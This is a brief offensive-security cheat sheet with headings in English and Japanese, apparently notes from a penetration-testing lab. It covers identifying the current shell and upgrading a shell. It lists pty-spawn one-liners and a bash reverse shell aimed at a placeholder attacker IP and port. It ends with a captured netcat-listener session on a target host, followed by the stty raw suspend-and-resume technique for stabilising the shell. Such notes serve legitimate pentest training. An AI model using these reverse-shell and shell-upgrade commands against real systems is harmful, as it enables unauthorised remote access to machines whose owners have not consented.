## Current Shell

```bash
echo $0
```

```bash
ps -p $$
```

## Login Shell

```bash
echo $SHELL
```

## Change Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
echo 'os.system('/bin/bash')'
```

```bash
/bin/sh -i
```

```bash
bash -i >& /dev/tcp/<攻撃者IP>/<ポート番号> 0>&1
```

```bash
perl -e 'exec "/bin/sh";'
```

# サスペンド（一時停止）
```zsh
rlwrap -cAr nc -lvnp 18000
listening on [any] 18000 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.248.117] 48652
python3 -c 'import pty;pty.spawn("/bin/bash")'
[cmeeks@hetemit restjson_hetemit]$ whoami
whoami
cmeeks
[cmeeks@hetemit restjson_hetemit]$ 
zsh: suspended  rlwrap -cAr nc -lvnp 18000
```

# 再開
```zsh
stty raw -echo;fg
[1]  + continued  rlwrap -cAr nc -lvnp 18000
[cmeeks@hetemit restjson_hetemit]$ 
```
